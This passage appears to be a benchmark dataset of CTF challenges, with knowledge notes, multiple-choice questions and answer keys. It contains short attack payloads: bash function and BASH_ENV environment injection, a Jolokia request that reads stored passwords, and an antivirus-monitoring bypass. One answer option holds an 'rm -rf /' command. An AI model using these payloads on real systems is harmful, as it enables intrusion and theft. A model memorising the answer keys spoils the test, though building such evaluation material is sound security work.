[
    {
        "name": "$hell Game$",
        "write_up": "dataset/raw/$hell Game$.md",
        "type": "misc",
        "competition": [
            "HackPack/2020",
            "https://ctftime.org/event/1036/tasks/"
        ],
        "score": 433,
        "max_score": 497,
        "difficulty": 0.8712273641851107,
        "knowledge": [
            "When faced with a restricted shell environment where common utilities are not available, leverage shell built-ins and simple script functions to replicate the functionality of basic commands like `ls` and `cat`. This allows enumeration of files and directories even in constrained environments.\n\n   - Example of replicating `ls`:  \n     ```bash\n     ls() { echo *; }\n     ```\n   \n   - Example of replicating `cat`:  \n     ```bash\n     cat() { while read l; do echo $l; done < $1; }\n     ```",
            "For complex operations like recursively searching through directories for a specific pattern in files, combining custom shell functions with external scripts (e.g., Python scripts) can efficiently automate the process. This approach is particularly useful when the environment limits the execution of standard tools or when dealing with unstable connections and buffer size limitations.\n\n   - Example snippet to search for files containing a specific pattern (`flag{`) recursively using a Python script:\n     ```python\n     def cat_files(r):  \n        lines = cmd(r, 'catf', False)  \n        for l in lines:  \n            if b'flag{' in l:  \n                pwd = cmd(r, 'pwd')[0]  \n                print(f'FLAG: {l.decode()}')  \n                print(f'PWD: {pwd}')  \n                sys.exit(1)\n     ```"
        ],
        "question": [
            "In a constrained shell environment where standard Unix utilities like `ls` are not available, it's possible to replicate basic functionalities using shell built-in commands and functions. Given an environment where you can only use shell builtins to interact with the filesystem, how could you create a simple version of the `ls` command to list files and directories?  - A. ls() { echo *; } - B. ls() { cat *; } - C. ls() { grep *; } - D. ls() { find . -type f; } ",
            "When dealing with a scenario requiring you to search through directories for files containing a specific pattern but are constrained by a limited shell environment, utilizing external scripts can be an efficient workaround. Considering such a situation, which approach best describes a method for recursively searching for a pattern `flag{` in files using a Python script, where both file and directory names are obtained through custom functions?  - A. Use a Python script to execute shell functions that list files and directories, then search each file for the specified pattern. - B. Write a Python script that uses standard Python libraries to list and open files directly. - C. Employ a Python script to send HTTP requests to each file path looking for the pattern. - D. Utilize a Python script to remotely execute binary utilities on the server for file searching. "
        ],
        "answer": [
            "A",
            "A"
        ]
    },
    {
        "name": "(Regulated) Environmental Issues",
        "write_up": "dataset/raw/(Regulated) Environmental Issues.md",
        "type": "misc",
        "competition": [
            "SpamAndFlags/2020/Quals",
            "https://ctftime.org/event/970/tasks/"
        ],
        "score": 192,
        "max_score": 500,
        "difficulty": 0.384,
        "knowledge": [
            "When exploiting shell script vulnerabilities, various GREP_OPTIONS and environmental variables like BASH_ENV, USE_SED, and PS4 can be modified to execute arbitrary commands or inject code. In scenarios where a script interacts with these options or variables, an attacker can manipulate them to achieve code execution or information disclosure. Utilizing GREP_OPTIONS to manipulate grep's behavior or setting BASH_ENV to a malicious value allows for the injection of unintended commands that the script will execute.\n   - Example payload manipulating GREP_OPTIONS: `[\"GREP_OPTIONS\",\"Flag\",\"flag\"]`\n   - Example payload using BASH_ENV for command execution: `[\"BASH_ENV\",\"flag\",\"bepis\"]`",
            "Bash functions can be exported into the shell environment and then redefined to execute arbitrary commands, including reading and disclosing sensitive files like flags in CTF challenges. This method works if the script or environment calls the overwritten bash function. This provides a bypass mechanism where direct command execution might be restricted. By exporting malicious definitions for commonly used functions or commands (`grep`, `set`, `test`, `echo`, `cat`, etc.), an attacker can force the script to execute the malicious function instead of the intended command.\n   - Example payload overwriting a bash function to execute a command: `[\"BASH_FUNC_grep%%\", \"() { cat flag; }\", \"bepis\"]`"
        ],
        "question": [
            "In a scenario where you are exploiting a vulnerability in a shell script that improperly handles environment variables, which of the following payloads could you use to manipulate the behavior of `grep` using the `GREP_OPTIONS` environment variable, resulting in the unintended execution of commands or disclosure of information? - A. `[\"GREP_PATH\",\"/etc/passwd\",\"flag\"]` - B. `[\"GREP_OPTIONS\",\"-v\",\"user\"]` - C. `[\"GREP_OPTIONS\",\"Flag\",\"flag\"]` - D. `[\"BASH_OPTIONS\",\"-i\",\"flag\"]`",
            "When attempting to exploit a shell script that interacts with bash functions, which of the following payloads demonstrates a technique for redefining the `grep` command by exporting a malicious bash function into the environment, enabling arbitrary command execution or information disclosure? - A. `[\"PATH_OVERWRITE_grep\", \"() { echo 'Compromised'; }\", \"target\"]` - B. `[\"BASH_ALTER_grep%%\", \"() { rm -rf /; }\", \"clean\"]` - C. `[\"BASH_FUNC_ls%%\", \"() { echo 'Compromised'; }\", \"list\"]` - D. `[\"BASH_FUNC_grep%%\", \"() { cat flag; }\", \"bepis\"]`"
        ],
        "answer": [
            "C",
            "D"
        ]
    },
    {
        "name": "0AV",
        "write_up": "dataset/raw/0AV.md",
        "type": "misc",
        "competition": [
            "zer0pts/2022",
            "https://ctftime.org/event/1555/tasks/"
        ],
        "score": -1,
        "max_score": -1,
        "difficulty": -1,
        "knowledge": [
            "When encountering anti-virus mechanisms in Linux environments that utilize `fanotify` to monitor and interfere with file access, an effective bypass can exploit Linux's handling of filesystem objects accessible through multiple paths. A specific scenario for this technique's applicability is when a security mechanism relies on `fanotify` to block or alter file access based on the file's content or access patterns. By performing a bind mount of the target directory to a new location, one can evade the `fanotify` checks, as `fanotify` monitors events only on the originally marked mountpoint. This method is contingent on the ability to create new mount namespaces, which can often be done by regular users when unprivileged user namespaces are enabled.\n\n    - **Practical Application**: By entering a new mount namespace and using `mount()` with the `MS_BIND` flag to bind mount the target directory (`/playground`) to a controlled location (`/tmp/mount`), it is possible to access the file without triggering the anti-virus' `fanotify` listener, thereby bypassing the file access restrictions imposed by the listener.",
            "Leveraging unprivileged user namespaces in Linux offers a path to circumvent security mechanisms that monitor file accesses or perform auto-remediation tasks such as file deletion upon detection of suspicious activity. This technique is particularly relevant when the operating environment permits the creation of new namespaces without requiring elevated permissions (`CAP_SYS_ADMIN`). This capability can be essential for bypassing security solutions that rely on monitoring file access patterns or content at a global (system-wide) level by isolating the actions (like file access) within a new, unmonitored namespace.\n\n    - **Practical Application**: Utilizing `unshare(CLONE_NEWUSER|CLONE_NEWNS)` followed by a bind mount allows for the isolation of file system manipulations from the broader system context, enabling actions such as reading otherwise restricted files by effectively sidestepping the monitoring mechanism. This approach hinges on the system's support for unprivileged user namespaces, a feature that varies based on kernel configuration and version."
        ],
        "question": [
            "When dealing with an antivirus mechanism on a Linux system that uses `fanotify` to intercept and block access to a file based on its contents, which of the following approaches can successfully bypass this security measure? - A. Changing the file owner to root. - B. Relocating the file to another directory not monitored by `fanotify`. - C. Creating a hard link to the file in a different directory. - D. Performing a bind mount of the file's directory to a new location and accessing it through that new path. ",
            "In a Linux environment that supports unprivileged user namespaces, what command would allow a process to isolate its file system changes from the global system, enabling it to bypass global file access monitoring mechanisms like those implemented with `fanotify`? - A. `fork()` - B. `execve(\"/new_namespace\")` - C. `unshare(CLONE_NEWUSER|CLONE_NEWNS)` - D. `chmod(0777, \"/new_namespace\")` "
        ],
        "answer": [
            "D",
            "C"
        ]
    },
    {
        "name": "0ff Again On Aga1n",
        "write_up": "dataset/raw/0ff Again On Aga1n.md",
        "type": "crypto",
        "competition": [
            "DEADFACE/2023",
            "https://ctftime.org/event/2031/tasks/"
        ],
        "score": -1,
        "max_score": -1,
        "difficulty": -1,
        "knowledge": [
            "In a challenge that involves decoding binary represented by colors, sequence, or symbols, the initial step should involve identifying patterns or groupings that correlate to binary digits (0 and 1). This can be based on the context of the challenge, such as the title or the hint provided, and can also employ trial and error with the assumption that the output should form legitimate characters or symbols. This approach is particularly useful in steganography or challenges where data is hidden in non-traditional formats.",
            "If the straightforward method (e.g., reading horizontally) does not yield a correct or complete solution, consider alternative methods of interpreting the data, such as changing the direction (e.g., reading vertically). This implies the importance of being flexible in decoding strategies and considering all possible interpretations given the context or nature of the puzzle. This method is especially applicable in challenges where data may be obfuscated or where initial assumptions lead to partial but incomplete solutions."
        ],
        "question": [
            "In a cryptography challenge, participants are given a series of colors that correspond to binary digits to decode a message. If the title of the challenge hints at binary with the presence of 0s and 1s, and considering that a proper English text output is expected, how should the decoding process start to test the hypothesis that different colors represent different binary values? - A. Assign arbitrary binary values to colors without considering the context. - B. Use the title's hint to assign binary values to colors based on their frequency in the image. - C. Assume each color directly translates to an ASCII character without converting to binary first. - D. Begin by assuming common binary prefixes for English letters, assigning 0 or 1 to colors based on this and refining through trial and error.",
            "In a binary decoding task, if the initial attempt of reading the encoded message horizontally does not reveal a meaningful output, which strategy should be attempted next to potentially uncover the correct message? - A. Continue reading horizontally but change the binary-to-color mapping randomly. - B. Keep the binary-to-color mapping but start reading the encodings in reverse order. - C. Switch to reading the encodings vertically while maintaining the same binary-to-color mapping initially established. - D. Decode each color as an individual character rather than converting them to binary first."
        ],
        "answer": [
            "D",
            "C"
        ]
    },
    {
        "name": "11011001",
        "write_up": "dataset/raw/11011001.md",
        "type": "reverse",
        "competition": [
            "HITCON/2020",
            "https://ctftime.org/event/1136/tasks/"
        ],
        "score": 255,
        "max_score": 384,
        "difficulty": 0.6640625,
        "knowledge": [
            "For shellcode challenges requiring operations to be undone or reversed, utilize CPU register states not affected by the challenge's reset or reversal mechanism. For instance, in scenarios where certain floating point or vector registers are not reset, these can be leveraged to preserve data across state resets, allowing for operations to be effectively reversed. Example payload component: `vmovups ymm0, yword [rax]` to save a value before reset and `vmovups yword [rax], ymm0` to restore it after reset.",
            "In challenges where binary input must satisfy a complex set of mathematical conditions, consider the use of symbolic execution or constraint solvers such as Z3. Conditions extracted from binaries can often be reimplemented in high-level scripts and solved much more efficiently when restructured as a series of equations for tools like Z3 to handle. This approach is particularly effective for inputs that must meet specific bitwise, arithmetic, or logical criteria to trigger desired behavior in the binary. Example use: translating binary logic into Python scripts that generate Z3 constraints, then solving these constraints to find the inputs that satisfy all the imposed conditions."
        ],
        "question": [
            "During a unique shellcode challenge, participants are required to delete and then rewrite a cookie by leveraging specific CPU registers that remain unchanged by the service's reset or reversal mechanisms. Which instruction accurately restores the preserved value back into memory after the reset using AVX instructions, given the preserved value was initially saved using the `vmovups ymm0, yword [rax]` instruction? - A. `vmovq xmm0, [rax]` - B. `vmovdqa ymm1, ymm0` - C. `vmovups yword [rax], ymm0` - D. `mov [rax], rdi` ",
            "When faced with a complex binary challenge requiring input that satisfies a series of intricate mathematical conditions, which approach can provide a more efficient solution by formulating and solving constraints? - A. Rewriting the binary logic in C++ and using standard libraries for optimization. - B. Directly debugging the binary to visually inspect and modify runtime values. - C. Implementing the logic in Python and using the Z3 solver to find inputs that meet all conditions. - D. Manual calculation of each condition to find a valid input. "
        ],
        "answer": [
            "C. `vmovups yword [rax], ymm0`",
            "C. Implementing the logic in Python and using the Z3 solver to find inputs that meet all conditions."
        ]
    },
    {
        "name": "404 Not Found",
        "write_up": "dataset/raw/404 Not Found.md",
        "type": "reverse",
        "competition": [
            "BSidesTLV/2022",
            "https://ctftime.org/event/1680/tasks/"
        ],
        "score": -1,
        "max_score": 100,
        "difficulty": -1,
        "knowledge": [
            "When faced with Java-based web applications, such as Jolokia, which provides an HTTP bridge to JMX (Java Management Extensions), extensive information gathering can be performed using directory and file enumeration tools like Gobuster. This can uncover administrative interfaces or sensitive endpoints revealing configuration details, potentially leading to unauthorized actions or information disclosure. For instance, using Gobuster with a custom wordlist can help identify exposed JMX interfaces and operations.\n   \n   Example command: `gobuster dir -u TARGET_URL -w wordlist.txt -t THREADS -k`",
            "In scenarios involving JMX over HTTP, like with Jolokia, it\u2019s possible to leverage MBean attributes and operations for fetching configuration details or invoking actions. Specifically, investigating the `list` response can reveal insights about the application's users, roles, and permissions. For sensitive data extraction such as passwords, constructing direct HTTP requests to read specific MBean attributes based on the JSON response information can expose critical information like passwords or configuration settings.\n\n   Example request: `https://TARGET_URL/jolokia/read/Users:database=UserDatabase,type=User,username=\"USERNAME\"/password`"
        ],
        "question": [
            "In a penetration testing scenario, when attempting to discover hidden paths or files on a Java-based web application server, which tool and options set is most effective for identifying exposed JMX interfaces and operations? - A. nmap -p 8080 --script http-enum TARGET_URL - B. nc -zv TARGET_URL 1-65535 - C. gobuster dir -u TARGET_URL -w wordlist.txt -t THREADS -k - D. sqlmap -u TARGET_URL --crawl=3 ",
            "If analyzing a JMX over HTTP interface like Jolokia and looking to extract sensitive data such as user passwords, which type of crafted request would be successful in reading an MBean attribute for this purpose? - A. POST /jolokia/search?mbean=Users:* HTTP/1.1 Host: TARGET_URL - B. GET /jolokia/read/Users:database=UserDatabase,type=User,username=\"USERNAME\"/password HTTP/1.1 Host: TARGET_URL - C. GET /phpmyadmin/sql.php?server=1&db=UserDatabase&table=Users&pos=0 HTTP/1.1 Host: TARGET_URL - D. POST /jolokia/write/Users:database=UserDatabase,type=User,username=\"USERNAME\"/password HTTP/1.1 Host: TARGET_URL "
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "435!",
        "write_up": "dataset/raw/435!.md",
        "type": "crypto",
        "competition": [
            "TMUCTF/2021",
            "https://ctftime.org/event/1427/tasks/"
        ],
        "score": 413,
        "max_score": 500,
        "difficulty": 0.826,
        "knowledge": [
            "When faced with a scenario where an encryption key contains missing characters (denoted by '*'), a brute force attack can be implemented if the number of missing characters is manageable, thus limiting the keyspace. A successful brute force attempt on the key facilitates the decryption of ciphertexts or the determination of correct encryption parameters. This approach is viable when the encryption key length is known but contains a few unknown characters, significantly reducing the total possible keys to test.",
            "For decryption of a message encrypted with AES in CBC mode where the IV (Initial Vector) is unknown but required to retrieve a flag, one can decrypt the blocks in reverse order. This method involves using the decrypted last block XORed with its preceding ciphertext block to check against a known plaintext pattern or value. By iteratively applying this process, one can move backwards through the ciphertext to eventually uncover the IV, assuming the encryption key is known or has been correctly guessed. \n   \nExample Application: Assuming the decrypted last block is `0x1f3ef3fab2bbfc838b9ef71867c3bcbb` and one knows the format of plaintext or a specific pattern that should appear in the plaintext, like a flag format or known plaintext ending, this information can be used to verify if the guessed key for decryption is correct by checking if the decrypted content matches the expected pattern."
        ],
        "question": [
            "In a situation where an encryption key is partially known with certain characters represented as asterisks (e.g., key = b'*XhN2*8d%8Slp3*v'), what is the feasible approach to recover the full encryption key considering the key's length and the missing character spaces are manageable? - A. Perform a linear cryptanalysis to deduce the missing characters. - B. Use a rainbow table to match the partially known key against pre-computed hash values. - C. Carry out a brute force attack by trying all possible combinations for the missing characters. - D. Apply differential cryptanalysis to exploit the structure of the encryption algorithm.",
            "For an AES CBC encrypted message where the Initial Vector (IV) is not known, given that one has managed to correctly guess or determine the encryption key, how might one proceed to decrypt the message and find the IV by using the known or guessed key and the structure of the encrypted message? - A. Encrypt the known plaintext with the guessed key to generate a new IV. - B. Decrypt the first block of ciphertext directly with the key to reveal the IV. - C. Reverse engineer the AES algorithm to calculate the IV without decryption. - D. Decrypt the ciphertext blocks in reverse order, utilizing each decrypted block XORed with its preceding ciphertext block to get closer to the IV."
        ],
        "answer": [
            "C",
            "D"
        ]
    },
    {
        "name": "64+word",
        "write_up": "dataset/raw/64+word.md",
        "type": "The type of challenge in this write-up is **forensics**.",
        "competition": [
            "HSCTF/2019",
            "https://ctftime.org/event/821/tasks/"
        ],
        "score": 500,
        "max_score": 500,
        "difficulty": 1.0,
        "knowledge": [
            "When dealing with encoded data in files such as base64 in CTF challenges, it is effective to first convert known tags or patterns relevant to the challenge (e.g., the flag format) into the same encoding to use as search patterns. This strategy narrows down the search area when manually or programmatically searching through large datasets or files. \n   - Example: Convert 'hsctf{' to base64, resulting in 'aHNjdGZ7', and use it as a search string.",
            "In challenges where the flag or other important information is hidden within large amounts of encoded text, writing a script to automate the search and decode process can significantly decrease the time required to find and retrieve the flag. This approach is crucial when the pattern may appear in non-standard formats (e.g., diagonally) across the dataset.\n   - No specific payload but implies creating a script that searches for a base64 encoded string, extracts, and decodes it."
        ],
        "question": [
            "When beginning a CTF challenge involving encoded data such as a base64 encoded flag, what is an effective initial step to assist in identifying and locating the flag? - A. Immediately decode the entire dataset hoping to recognize the flag format. - B. Convert a known flag format or distinctive pattern into the same encoding as the dataset and use this for searching. - C. Manually inspect the entire dataset for any patterns that resemble the flag. - D. Ignore the encoding and search for plaintext patterns that could potentially be the flag.",
            "In the context of a CTF challenge where the flag is hidden in a large encoded text file (e.g., base64), which approach is most efficient for locating and retrieving the flag? - A. Decoding the entire file and manually reading through it to find the flag. - B. Writing a script to convert random segments of text into different encodings until the flag is found. - C. Posting the encoded data on forums to ask for help in interpreting the data. - D. Developing a script that searches for a known encoded pattern, extracts, and decodes it to retrieve the flag."
        ],
        "answer": [
            "B",
            "D"
        ]
    },
    {
        "name": "90",
        "write_up": "dataset/raw/90.9 WPIFM.md",
        "type": "The type of this CTF challenge is \"steganography\".",
        "competition": [
            "BSidesTLV/2020",
            "https://ctftime.org/event/1078/tasks/"
        ],
        "score": -1.0,
        "max_score": 600,
        "difficulty": -1,
        "knowledge": [
            "In challenges involving steganography through audio files, analyzing the audio visually with software like Audacity can reveal patterns in the waveform, such as regular intervals of static or music that represent binary data (`1` for music chunks, `0` for static chunks). This approach requires identifying the standard units of the encoded message segments within the audio file.",
            "When dealing with audio steganography where specific segments of audio (e.g., static noise) are consistently reused, a Fast Fourier Transform (FFT) can be applied to these segments to generate a frequency spectrum. This spectrum can then be used to correlate and identify similar segments throughout the audio file, effectively translating them into binary data. This process can involve parameter tweaking for accurate correlation without false positives, which is crucial for decoding the message correctly."
        ],
        "question": [
            "In a steganography challenge involving an audio file that plays various types of music interrupted by static noise, using Audacity revealed that music clips last for one second while static clips last for a quarter of a second. Given this observation, how should these segments be interpreted to decode the hidden binary message? - A. Music clips represent '0' and static clips represent '1' - B. Music clips represent '1' and static clips represent '0' - C. Both music and static clips represent '1' - D. Both music and static clips represent '0'",
            "When analyzing an audio file for audio steganography and given a consistent static sound, which technique is most appropriate for comparing segments of the audio to this static sound to determine whether a segment contains static or music, thereby converting the segments into binary data? - A. Apply a Fast Fourier Transform (FFT) on the static sound and compare it with the segments to identify matches. - B. Use simple amplitude comparison to distinguish between static and music. - C. Convert the audio file into an image and manually identify the static segments. - D. directly listen to each segment and classify it based on hearing."
        ],
        "answer": [
            "B",
            "A"
        ]
    },
    {
        "name": "A Bit Weird",
        "write_up": "dataset/raw/A Bit Weird.md",
        "type": "crypto",
        "competition": [
            "UTCTF/2021",
            "https://ctftime.org/event/1177/tasks/"
        ],
        "score": 986,
        "max_score": 1000,
        "difficulty": 0.986,
        "knowledge": [
            "In RSA-like challenges where the encryption process involves bitwise operations (specifically, the or-operation `m | x`) between the message `m` and a known value `x`, if the upper bits of the result are known to match `x` and the length of `m` is significantly shorter, Coppersmith's method can be utilized to recover `m`. The stereotyped message attack via Coppersmith's method can be particularly effective in scenarios where a part of the plaintext is known or can be inferred. This approach involves setting up the equation `(known_part + x)^e - C` and solving for `x`, with `C` being the given ciphertext, `e` the encryption exponent, and `known_part` being the portion of the plaintext deduced from context or hints.",
            "Once the modified plaintext `m | x` is obtained from exploiting RSA with stereotyped messages using Coppersmith's method, the original message `m` can be recovered through bitwise manipulation. Given the known values of `x` and `m & x`, this can be achieved by iterating over each bit of `x` and `m | x`, comparing them, and determining the corresponding bit in the original message `m`. This method relies on the understanding that if a bit in `x` is 0, the corresponding bit in `m` is directly determined by the bit in `m | x`, while if a bit in `x` is 1, the corresponding bit in `m` must match the bit in `m & x`."
        ],
        "question": [
            "In a cybersecurity challenge involving RSA encryption with an added twist of bitwise OR operation (`m | x`) between the plaintext `m` and a known obscuring term `x`, assuming you have the following details:  - The encryption exponent `e = 3` - A large ciphertext `C` - The length of `m` is significantly smaller than the length of `x` - The upper bits of `m | x` are known to match those of `x`  You are considering using Coppersmith's method to recover `m`. Which statement best represents the rationale for choosing Coppersmith's method in this scenario?  - A. Coppersmith's method is useful for factoring large integers quickly. - B. Coppersmith's method exploits the RSA modulus to recover the encryption exponent directly. - C. Coppersmith's method can find small roots of polynomials modulo an integer, facilitating the recovery of messages in stereotyped message attacks. - D. Coppersmith's method decrypts RSA ciphertexts directly without needing the private key. ",
            "Given the recovery of a modified plaintext `m | x` from RSA encryption that included a bitwise OR operation with a known term `x`, and that you now possess both `m & x` and `m | x`, your next step is to recover the original plaintext `m`. Considering the properties of bitwise operations, which process correctly describes how to reconstruct `m` from the provided data?  - A. For each bit, if a bit in `x` is 1 and the corresponding bit in `m | x` is 0, then the bit in `m` is 1; otherwise, it is 0. - B. For each bit, if a bit in `x` is 0, then the corresponding bit in `m` is the opposite of that in `m | x`; if a bit in `x` is 1, then directly copy the bit from `m & x`. - C. Iterate through each bit of `x` and `m | x`; if a bit in `x` is 0, use the corresponding bit in `m | x` for `m`; if a bit in `x` is 1, use the bit from `m & x` for `m`. - D. Sum the bits in `m & x` and `m | x`, and apply modulo 2 for each bit to reconstruct `m`. "
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "A Christmas Dilemma",
        "write_up": "dataset/raw/A Christmas Dilemma.md",
        "type": "pwn",
        "competition": [
            "X-MAS/2018",
            "https://ctftime.org/event/724/tasks/"
        ],
        "score": 205,
        "max_score": 591,
        "difficulty": 0.34686971235194586,
        "knowledge": [
            "For challenges requiring solving a CAPTCHA where the solution involves generating a hash with a specific format (e.g., the first 5 characters of an MD5 hash match a given pattern), a straightforward brute force script can be effectively used. This approach iterates through potential solutions, hashing each one until the hash begins with the specified pattern.\n   - Example payload:\n     ```python\n     import hashlib\n     s.recvuntil(\"Give a string X such that md5(X).hexdigest()[:5]=\")\n     target = s.recvuntil(\".\\n\")[:-2]\n     i = 0\n     while True:\n       if hashlib.md5(str(i).encode()).hexdigest()[:5] == target:\n           s.sendall(str(i) + \"\\n\")\n           break\n       i += 1\n     ```",
            "When faced with a mathematical or algorithmic challenge that requires finding the maximum value of a function within a given range, and the total number of permitted queries is significantly higher than the range size, one can employ a comprehensive query approach. This involves iterating through the entire range, querying the function at each point, and then applying a binary search-like technique to increase precision around the discovered maximum. If the result must be accurate to a specific decimal place, reduce the gap by half and compare values by querying at points slightly less and more than the known maximum until the desired precision is achieved.\n   - Example exploration and precision refinement method (simplified representation):\n     ```python\n     # Assuming `s` is a socket connected to the challenge server\n     functionRange = [start, end]  # Obtained from the server\n     y = []\n     for i in range(functionRange[0], functionRange[1]+1):\n       s.sendall(f\"1\\n{i}\\n\".encode())\n       s.recvuntil(\") = \")\n       y.append(float(s.recvuntil('\\n')[:-1]))\n     x = functionRange[0] + y.index(max(y))\n     gap = 0.5\n     while gap > desired_precision:\n       query_pos = [(x + gap), (x - gap)]\n       for pos in query_pos:\n         s.sendall(f\"1\\n{pos}\\n\".encode())\n         # Process server response to decide if this new position gives a better maximum\n       # Adjust x according to which position gave a better result, then reduce gap\n     # Finally, submit best guess\n     ```\nThis approach exploits the limited range and query count to use brute force effectively first, then fine-tuning via a methodical narrowing down, which is broadly applicable in optimization and search problems in CTFs."
        ],
        "question": [
            "In a challenge that involves breaking a CAPTCHA by finding a string whose MD5 hash meets a specific requirement, what Python module is necessary for generating the hash value as part of the solution? - A. os - B. hashlib - C. json - D. socket",
            "In an algorithmic challenge aimed at finding the maximum value of a function within a given interval, which technique is effective for refining the precision of the maximum after initially identifying it through comprehensive querying? - A. Using a linear search with a fixed gap that decreases over time. - B. Employing a binary search algorithm to reduce the search space. - C. Implementing a sort function to reorder the queried values. - D. Applying a recursive function that divides the problem into smaller sub-problems."
        ],
        "answer": [
            "B",
            "B"
        ]
    },
    {
        "name": "A Flash of Inspiration",
        "write_up": "dataset/raw/A Flash of Inspiration.md",
        "type": "pwn",
        "competition": [
            "RACTF/2020",
            "https://ctftime.org/event/1051/tasks/"
        ],
        "score": 300,
        "max_score": 700,
        "difficulty": 0.42857142857142855,
        "knowledge": [
            "When working with Arduino or similar microcontrollers, converting binary files to a format suitable for flashing, such as the Intel Hex format, is often required. Tools like Bin2Hex.py can be used for this conversion, providing a pathway to use compiled binaries on devices. To do this, one must first convert the given binary file (.bin) to an Intel Hex file (.hex) before flashing it onto the device.",
            "When encountering invalid or scrambled output after flashing a device like an Arduino, the baud rate settings can be a likely cause. Adjusting the baud rate can resolve communication issues between the device and the computer. In scenarios where the standard baud rate does not yield readable output, gradually reducing the baud rate until legible output appears is a practical troubleshooting method. In this case, changing the baud rate to 19200 resulted in successfully obtaining legible data, which can be particularly useful in CTF challenges involving hardware."
        ],
        "question": [
            "When preparing to flash a compiled binary onto an Arduino, which of the following steps is essential before the flashing process? - A. Convert the binary file (.bin) directly to a machine code file (.mc) for compatibility. - B. Modify the binary file (.bin) to change its architecture to match that of the Arduino manually. - C. Convert the binary file (.bin) to an Intel Hex file (.hex) using a tool like Bin2Hex.py. - D. Encrypt the binary file (.bin) to ensure security during the flashing process.",
            "When flashing an Arduino and encountering invalid characters in the output, which troubleshooting technique was demonstrated to be effective? - A. Increasing the baud rate to the maximum supported by the device. - B. Flashing the device in bootloader mode to bypass baud rate configurations. - C. Gradually reducing the baud rate until legible output appears, such as changing it to 19200. - D. Converting the output characters to Hex format to decode the invalid characters."
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "A Happy Family",
        "write_up": "dataset/raw/A Happy Family.md",
        "type": "reverse",
        "competition": [
            "angstrom/2020",
            "https://ctftime.org/event/982/tasks/"
        ],
        "score": 120,
        "max_score": 300,
        "difficulty": 0.4,
        "knowledge": [
            "When presented with a challenge involving encryption or encoding that utilizes a custom alphabet, systematically mapping each character of the custom alphabet to its encoded or numerical representation is an effective strategy. This approach allows for the generation of all possible encoded or encrypted messages that can be further analyzed or decoded. Organizing the custom alphabet mappings and generating all combinations through Cartesian product (`itertools.product`) can reveal hidden messages or keys when converted back (e.g., conversion from base 13 to decimal in this scenario).",
            "Reversing an encoding scheme often involves understanding the underlying mathematical or logical operations applied to the original input. In challenges where inputs are transformed into encoded or encrypted outputs, reversing the process typically requires developing an inverse function that undoes the operations. For example, converting encoded strings back to numbers (considering the base or encoding scheme), then applying reverse mathematical operations or transformations to retrieve the original input or flag."
        ],
        "question": [
            "In a challenge, a custom encoding scheme has been used where each letter of the phrase \"angstromctf20\" is mapped to a string of characters represented by numbers from a custom alphabet \"0123456789ABC\". This encoded string must then be converted using base 13. Given this scenario, what would be the first step in attempting to decode or reverse this encoding process? - A. Perform a hexadecimal conversion of the encoded string. - B. Apply an MD5 hash function to the encoded string for comparison. - C. Map each character of the custom \"angstromctf20\" alphabet to its numerical representation in the custom alphabet, and then generate all possible combinations using a Cartesian product. - D. Directly translate each character of the encoded string to ASCII without any mapping.",
            "When faced with a challenge that entails reversing a custom encoding scheme where encoded strings are converted into numbers using a specific base and then transformed into messages, what method should be employed to retrieve the original message accurately? - A. Use string concatenation to combine all numeric values without conversion. - B. Decrypt each character of the encoded string using a standard encryption algorithm like AES. - C. Convert the encoded strings back to numbers considering the base or encoding scheme used, and then apply reverse mathematical operations or transformations. - D. Ignore the base conversion and attempt to match encoded strings with potential plain text values directly."
        ],
        "answer": [
            "C.",
            "C."
        ]
    },
    {
        "name": "A Lost Cause",
        "write_up": "dataset/raw/A Lost Cause.md",
        "type": "crypto",
        "competition": [
            "HSCTF/2019",
            "https://ctftime.org/event/821/tasks/"
        ],
        "score": 196,
        "max_score": 500,
        "difficulty": 0.392,
        "knowledge": [
            "When dealing with a Caesar cipher challenge where the description hints at a variable shift pattern (in this case, \"every subsequent letter is shifted one less than the previous\"), it is important to consider interpreting the pattern in both increasing and decreasing directions of shift. This means if the initial assumption on the direction of shift does not yield meaningful output, reversing the direction may lead to the correct decryption.",
            "Efficiently solving complex cipher challenges often requires scripting. A Python script, for example, can be used to automate the decryption process by iteratively applying shifts in both directions over the ciphertext. This approach is particularly useful when manually decrypting the text is impractical due to the complexity or length of the cipher. Here\u2019s a sample Python approach for variable directional shifts:\n   \n   ```python\n   def decrypt_caesar_variable_shift(ciphertext):\n       # Example: Decrypt with shifts in the reverse direction\n       shift = 1\n       plaintext = ''\n       for char in ciphertext:\n           # Assuming ciphertext is uppercase and ignoring non-alphabet characters\n           if char.isupper():\n               decrypted_char = chr((ord(char) - shift - 65) % 26 + 65)\n               plaintext += decrypted_char\n               shift += 1 # Adjust shift for next char\n           else:\n               # Directly append non-alphabet characters\n               plaintext += char\n       return plaintext\n   ciphertext = \"CGULKVIPFRGDOOCSJTRRVMORCQDZG\"\n   print(decrypt_caesar_variable_shift(ciphertext))\n   ```\n   \n   Note: This sample code might require modifications to match the exact requirements of decoding as per the challenge description, such as changing the direction of shift or starting shift value."
        ],
        "question": [
            "In a Caesar cipher challenge, the decryption process may need to consider the shift direction based on a variable pattern. If the initial decryption attempt with a progressively increasing shift for each letter produces nonsensical output, what should be the next step? - A. Keep increasing the shift progressively and retry. - B. Decrease the shift progressively for each letter. - C. Use the same shift value for all letters. - D. Randomize the shift values for each letter.",
            "Given a programming task to decrypt a Caesar cipher with a variable shift pattern (where each subsequent letter is shifted one less/more than the previous), which approach is most efficient? - A. Decrypting the cipher manually letter by letter. - B. Using a Python script to automate the decryption by iteratively applying shifts in both directions over the ciphertext. - C. Consulting an online Caesar cipher tool to try each shift value manually. - D. Writing a detailed mathematical proof to predict the plaintext without actual decryption."
        ],
        "answer": [
            "B.",
            "B."
        ]
    },
    {
        "name": "A New Hope",
        "write_up": "dataset/raw/A New Hope.md",
        "type": "web",
        "competition": [
            "SpaceHeroes/2023",
            "https://ctftime.org/event/1856/tasks/"
        ],
        "score": 184,
        "max_score": 1000,
        "difficulty": 0.184,
        "knowledge": [
            "When dealing with seemingly corrupted or unopenable files within a CTF challenge, consider checking the file's magic bytes to determine if the file type is correct or has been altered. Use tools like `hexedit` to inspect and modify the hex values at the beginning of the file to match the expected file signature for its true format. Changing the file's extension to match its actual format, based on the corrected magic bytes, may then allow the file to open normally.\n    - Example Payload: To correct a JPEG file that starts with incorrect magic bytes, ensure the first few hex values are set to `FF D8 FF E0`, indicating a JPEG file, if it was mistakenly labeled or presented as another file type.",
